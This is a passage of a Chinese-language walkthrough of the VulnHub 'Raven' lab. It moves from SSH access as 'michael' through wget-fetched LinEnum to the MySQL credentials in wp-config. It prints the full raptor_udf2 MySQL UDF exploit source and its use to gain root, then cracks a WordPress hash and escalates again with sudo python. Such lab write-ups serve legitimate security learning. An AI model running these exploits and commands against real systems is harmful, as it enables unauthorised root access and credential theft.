结果返回了在受害人机器上创建的2位用户：

Michael and Steven

#### getshell

继续在同一端口上进行操作,尝试使用端口22（SSH）。将用户名和密码也使用相同的单词是一种非常合乎逻辑的“尝试”方法。使用“michael”作为用户名和密码登录到SSH并成功进入Shell！

``` bash
root@kali:~# ssh michael@192.168.56.118
The authenticity of host '192.168.56.118 (192.168.56.118)' can't be established.
ECDSA key fingerprint is SHA256:rCGKSPq0sUfa5mqn/8/M0T63OxqkEIR39pi835oSDo8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.118' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
michael@192.168.56.118's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
michael@Raven:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
michael@Raven:~$ whoami
michael
```

然后，将目录更改为/tmp并导入了LinEnum.sh，该脚本用于枚举许多基本和高级Linux详细信息。它托管在本地计算机上的文件夹中，并使用wget命令导入到受害者计算机中。

``` bash
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.56.1 - - [14/Feb/2020 04:45:37] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [14/Feb/2020 04:45:41] "GET /LinEnum.sh HTTP/1.1" 200 -
192.168.56.118 - - [14/Feb/2020 04:46:02] "GET /LinEnum.sh HTTP/1.1" 200 -

michael@Raven:/tmp$ wget 192.168.56.102:8000/LinEnum.sh
--2020-02-15 04:46:01--  http://192.168.56.102:8000/LinEnum.sh
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 (45K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                     100%[=====================================================>]  45.39K  --.-KB/s   in 0s     

2020-02-15 04:46:01 (470 MB/s) - ‘LinEnum.sh’ saved [46476/46476]

michael@Raven:/tmp$ chmod 777 *
michael@Raven:/tmp$ ls
LinEnum.sh
michael@Raven:/tmp$ ls -la
total 76
drwxrwxrwt  7 root    root     4096 Feb 15 04:46 .
drwxr-xr-x 22 root    root     4096 Aug 13  2018 ..
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .font-unix
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .ICE-unix
-rwxrwxrwx  1 michael michael 46476 Dec 21 00:44 LinEnum.sh
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .Test-unix
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .X11-unix
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .XIM-unix
```

然后运行脚本发现下面敏感信息输出结果如下
发现MySQL服务正在运行（端口3306很明显）。

``` bash
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:60286           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::111                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::39258                :::*                    LISTEN      -               

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:8641            0.0.0.0:*                           -               
udp        0      0 0.0.0.0:43233           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:995             0.0.0.0:*                           -               
udp        0      0 127.0.0.1:1005          0.0.0.0:*                           -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
udp6       0      0 :::11443                :::*                                -               
udp6       0      0 :::995                  :::*                                -               
udp6       0      0 :::52570                :::*                                -               
udp6       0      0 :::111                  :::*                                -
```

发现了一个MySQL开发漏洞，远程root代码执行，Privesc漏洞！

参考[MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662](https://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html)

``` bash
root       547  0.0  0.3   4340  1620 ?        S    04:11   0:00 /bin/sh /usr/bin/mysqld_safe
root       895  0.0  4.5 232508 23072 ?        Ss   04:11   0:00 /usr/sbin/apache2 -k start
root       922  0.0 10.2 814920 51920 ?        Sl   04:12   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
www-data   986  0.0  7.3 238928 37300 ?        S    04:12   0:00 /usr/sbin/apache2 -k start
www-data   987  0.0  6.8 236172 34664 ?        S    04:12   0:00 /usr/sbin/apache2 -k start
www-data   988  0.0  6.1 234084 31328 ?        S    04:12   0:00 /usr/sbin/apache2 -k start
```

因此，将当前目录更改为/var/www/html/wordpress并搜索了wp-config文件，因为该文件具有MySQL数据库的密码。

``` bash
michael@Raven:/tmp$ cd /var/www/html/wordpress
michael@Raven:/var/www/html/wordpress$ ls
index.php    wp-activate.php     wp-comments-post.php  wp-content   wp-links-opml.php  wp-mail.php      wp-trackback.php
license.txt  wp-admin            wp-config.php         wp-cron.php  wp-load.php        wp-settings.php  xmlrpc.php
readme.html  wp-blog-header.php  wp-config-sample.php  wp-includes  wp-login.php       wp-signup.php
michael@Raven:/var/www/html/wordpress$ cat wp-con
wp-config.php         wp-config-sample.php  wp-content/           
michael@Raven:/var/www/html/wordpress$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '0&ItXmn^q2d[e*yB:9,L:rR<B`h+DG,zQ&SN{Or3zalh.JE+Q!Gi:L7U[(T:J5ay');
define('SECURE_AUTH_KEY',  'y@^[*q{)NKZAKK{,AA4y-Ia*swA6/O@&*r{+RS*N!p1&a$*ctt+ I/!?A/Tip(BG');
define('LOGGED_IN_KEY',    '.D4}RE4rW2C@9^Bp%#U6i)?cs7,@e]YD:R~fp#hXOk$4o/yDO8b7I&/F7SBSLPlj');
define('NONCE_KEY',        '4L{Cq,%ce2?RRT7zue#R3DezpNq4sFvcCzF@zdmgL/fKpaGX:EpJt/]xZW1_H&46');
define('AUTH_SALT',        '@@?u*YKtt:o/T&V;cbb`.GaJ0./S@dn$t2~n+lR3{PktK]2,*y/b%<BH-Bd#I}oE');
define('SECURE_AUTH_SALT', 'f0Dc#lKmEJi(:-3+x.V#]Wy@mCmp%njtmFb6`_80[8FK,ZQ=+HH/$& mn=]=/cvd');
define('LOGGED_IN_SALT',   '}STRHqy,4scy7v >-..Hc WD*h7rnYq]H`-glDfTVUaOwlh!-/?=3u;##:Rj1]7@');
define('NONCE_SALT',       'i(#~[sXA TbJJfdn&D;0bd`p$r,~.o/?%m<H+<>Vj+,nLvX!-jjjV-o6*HDh5Td{');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
        define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
```

发现密码为：

``` bash
R@v3nSecurity
```

#### 发现第一个flag

``` bash
michael@Raven:/var/www/html/wordpress$ find / -name "flag*" 2>/dev/null
/var/www/flag2.txt
/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html
/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
michael@Raven:/var/www/html/wordpress$ cat /var/www/flag2.txt
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
```

#### mysql udf提权

因此，搜索了UDF动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518.c”。

MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)

``` bash
/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work 
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol 
 * that corresponds to the main xxx() function. These auxiliary symbols 
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and 
 * xxx_add() functions". -- User Defined Functions Security Precautions 
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
	unsigned int		arg_count;	// number of arguments
	enum Item_result	*arg_type;	// pointer to item_result
	char 			**args;		// pointer to arguments
	unsigned long		*lengths;	// length of string args
	char			*maybe_null;	// 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
	char			maybe_null;	// 1 if func can return NULL
	unsigned int		decimals;	// for real functions
	unsigned long 		max_length;	// for string functions
	char			*ptr;		// free ptr for func data
	char			const_item;	// 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
	if (args->arg_count != 1)
		return(0);

	system(args->args[0]);

	return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
	return(0);
}

// milw0rm.com [2006-02-20]
```

该漏洞利用是通过将原始C代码编译为“.so”文件，将其传输到受害计算机并利用MySQL漏洞来运行的。第一步是对其进行编译。

``` bash
root@kali:~/vulnhub/raven1# cp /usr/share/exploitdb/exploits/linux/local/1518.c .
root@kali:~/vulnhub/raven1# ls
1518.c
root@kali:~/vulnhub/raven1# gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
root@kali:~/vulnhub/raven1# ls
1518.c  1518.so
```

然后，启动了本地服务器，并将此1518.so文件传输到受害人的/tmp目录，因为使用wget命令可以通用地读取和写入该文件。

``` bash
root@kali:~/vulnhub/raven1# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.56.1 - - [14/Feb/2020 05:55:48] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [14/Feb/2020 05:55:55] "GET / HTTP/1.1" 200 -
192.168.56.118 - - [14/Feb/2020 05:56:12] "GET /1518.so HTTP/1.1" 200 -
```

``` bash
michael@Raven:/tmp$ wget 192.168.56.102:8000/1518.so
--2020-02-15 05:56:10--  http://192.168.56.102:8000/1518.so
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19088 (19K) [application/octet-stream]
Saving to: ‘1518.so’

1518.so                        100%[=====================================================>]  18.64K  --.-KB/s   in 0s     

2020-02-15 05:56:10 (150 MB/s) - ‘1518.so’ saved [19088/19088]

michael@Raven:/tmp$ chmod 777 *
michael@Raven:/tmp$ ls -la
total 152
drwxrwxrwt  7 root    root     4096 Feb 15 05:56 .
drwxr-xr-x 22 root    root     4096 Aug 13  2018 ..
-rwxrwxrwx  1 michael michael 19088 Feb 14 21:50 1518.so
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .font-unix
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .ICE-unix
-rwxrwxrwx  1 michael michael 55193 Feb 15 04:48 info.txt
-rwxrwxrwx  1 michael michael 46476 Dec 21 00:44 LinEnum.sh
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .Test-unix
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .X11-unix
drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .XIM-unix
```

下面连接数据库开始提权

``` bash
michael@Raven:/tmp$ mysql -uroot -pR@v3nSecurity
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 70
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.01 sec)

mysql>
```

在获得MySQL Shell之后，开始使用刚刚发现的漏洞来利用它

``` bash
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

现在，创建一个名为“foo”的表在此表中，将链接插入了刚刚从本地计算机导入到/tmp目录的1518.so文件。将相同的文件转储到/usr/lib/mysql/plugin/目录（因为它容易受到攻击）在最重要的步骤中，创建了一个名为do_system的UDF函数，该函数将调用实现该函数的代码。因此，正在调用代码“chmod u + s /usr/bin/ find”以将粘性位设置为“find”

``` bash
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/tmp/1518.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
Query OK, 1 row affected (0.01 sec)

mysql> create function do_system returns integer soname '1518.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('chmod u+s /usr/bin/find');
+--------------------------------------+
| do_system('chmod u+s /usr/bin/find') |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row in set (0.00 sec)
```

现在，遍历目录/tmp并使用find程序执行命令。

``` bash
michael@Raven:/tmp$ touch raj
michael@Raven:/tmp$ find raj -exec "whoami" \;
root
michael@Raven:/tmp$ find raj -exec "/bin/sh" \;
# id
uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
# whoami
root
# cd /root
# ls
flag4.txt
# cat flag4.txt 
______                      

| ___ \                     

| |_/ /__ ___   _____ _ __  

|    // _` \ \ / / _ \ '_ \ 

| |\ \ (_| |\ V /  __/ | | |

\_| \_\__,_| \_/ \___|_| |_|

                            
flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!

This is my first Boot2Root VM - I hope you enjoyed it.

Hit me up on Twitter and let me know what you thought: 

@mccannwj / wjmccann.github.io
```

到这一步找到了第二个flag

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub212.jpg)


#### 提权方法二

如上所述到达MySQL Shell，然后采用替代方法。查看所有数据库，并从“WordPress”数据库中的wp_users表中转储用户名

``` bash
mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name   |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 | michael       | michael@raven.org |          | 2018-08-12 22:49:12 |                     |           0 | michael        |
|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven        | steven@raven.org  |          | 2018-08-12 23:31:16 |                     |           0 | Steven Seagull |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+----------------+
2 rows in set (0.00 sec)
```

发现了两个哈希值，但是由于已经知道了Michael的密码，因此使用hashcat通过将哈希值粘贴到名为“password.txt”的文本文件中来破解了Steven的密码。
由于gpu性能太强，一秒出密码

``` bash
D:\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -a 0 -m 400 password.txt D:/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: Intel's OpenCL runtime (GPU only) is currently broken.
             We are waiting for updated OpenCL drivers from Intel.
             You can use --force to override, but do not report related errors.
nvmlInit(): Unknown Error

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU

OpenCL Platform #2: Intel(R) Corporation
========================================
* Device #2: Intel(R) UHD Graphics 630, skipped.
* Device #3: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: D:/wordlists/rockyou.txt
* Passwords.: 14344360
* Bytes.....: 139921318
* Keyspace..: 14344360

$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/:pink84

Session..........: hashcat
Status...........: Cracked
Hash.Type........: phpass, WordPress (MD5), phpBB3 (MD5), Joomla (MD5)
Hash.Target......: $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
Time.Started.....: Fri Feb 14 19:47:16 2020 (1 sec)
Time.Estimated...: Fri Feb 14 19:47:17 2020 (0 secs)
Guess.Base.......: File (D:/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1114.4 kH/s (7.11ms) @ Accel:512 Loops:128 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 524288/14344360 (3.66%)
Rejected.........: 0/524288 (0.00%)
Restore.Point....: 0/14344360 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192
Candidates.#1....: 123456 -> chadj85
Hardware.Mon.#1..: N/A

Started: Fri Feb 14 19:47:10 2020
Stopped: Fri Feb 14 19:47:19 2020
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub213.jpg)

得到密码为pink84

当然也可以用john来破解，更加的方便，但是所需时间更长

``` bash
root@kali:~/vulnhub/raven1# john hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
pink84           (?)
1g 0:00:01:17 DONE 3/3 (2020-02-14 06:52) 0.01287g/s 47616p/s 47616c/s 47616C/s poslus..pingar
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```

登录到steven的shell并运行sudo -l命令，发现Python不需要root权限即可运行。因此，使用python的单行代码生成了python PTY shell。

``` bash
michael@Raven:/tmp$ su steven
Password: 
$ sudo -l
Matching Defaults entries for steven on raven:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
$ sudo python -c 'import pty;pty.spawn("/bin/bash")'
root@Raven:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@Raven:/tmp# whoami
root
root@Raven:/tmp#
```

可以看到成功的提升到了root权限的shell

``` bash
root@Raven:/tmp# find / -name "flag*" 2>/dev/null
/var/www/flag2.txt
/root/flag4.txt
/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html
/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html
/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/platform/serial8250/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
```

发现还是只有两个flag文件

``` bash
/var/www/flag2.txt
/root/flag4.txt
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub214.jpg)

#### 继续寻找剩下的两个flag

通过目录扫描发现下面的url

``` bash
http://192.168.56.118/service.html
```

右键查看源码，发现flag

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub215.jpg)

``` bash
<!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
```

还剩下最后一个flag，再次连接数据库，进入数据库查找

``` bash
root@Raven:~# mysql -uroot -pR@v3nSecurity
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 74
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_posts;
+----+-------------+---------------------+---------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------+-------------+----------------+-------------+---------------+---------------+---------+--------+---------------------+---------------------+-----------------------+-------------+------------------------------------------------------------------+------------+-----------+----------------+---------------+
| ID | post_author | post_date           | post_date_gmt       | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | post_title   | post_excerpt | post_status | comment_status | ping_status | post_password | post_name     | to_ping | pinged | post_modified       | post_modified_gmt   | post_content_filtered | post_parent | guid                                                             | menu_order | post_type | post_mime_type | comment_count |
+----+-------------+---------------------+---------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------+--------------+-------------+----------------+-------------+---------------+---------------+---------+--------+---------------------+---------------------+-----------------------+-------------+------------------------------------------------------------------+------------+-----------+----------------+---------------+
|  1 |           1 | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 | Welcome to WordPress. This is your first post. Edit or delete it, then start writing!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Hello world! |              | publish     | open           | open        |               | hello-world   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?p=1                            |          0 | post      |                |             1 |
|  2 |           1 | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 | This is an example page. It's different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:

<blockquote>Hi there! I'm a miner by day, aspiring actor by night, and this is my website. I live in Kalgoorlie, have a great dog named Red, and I like yabbies. (And gettin' a tan.)</blockquote>

...or something like this:

<blockquote>The XYZ Doohickey Company was founded in 1971, and has been providing quality doohickeys to the public ever since. Located in Gotham City, XYZ employs over 2,000 people and does all kinds of awesome things for the Gotham community.</blockquote>

As a new WordPress user, you should go to <a href="http://192.168.206.131/wordpress/wp-admin/">your dashboard</a> to delete this page and create new pages for your content. Have fun! | Sample Page  |              | publish     | closed         | open        |               | sample-page   |         |        | 2018-08-12 22:49:12 | 2018-08-12 22:49:12 |                       |           0 | http://192.168.206.131/wordpress/?page_id=2                      |          0 | page      |                |             0 |
